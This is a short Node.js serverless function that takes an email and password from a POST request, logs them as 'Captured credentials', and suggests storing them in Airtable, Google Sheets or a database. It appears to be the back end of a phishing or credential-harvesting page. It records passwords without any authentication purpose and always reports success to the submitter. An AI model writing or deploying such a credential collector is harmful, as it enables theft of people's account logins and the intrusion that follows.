module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }
  
  const { email, password } = req.body;
  
  // Log credentials (in a real scenario, you'd save to a database)
  console.log(`Captured credentials: Email: ${email}, Password: ${password}`);
  
  // You could also use a service like Airtable, Google Sheets, or a database
  // to store the captured credentials
  
  return res.status(200).json({ success: true });
};
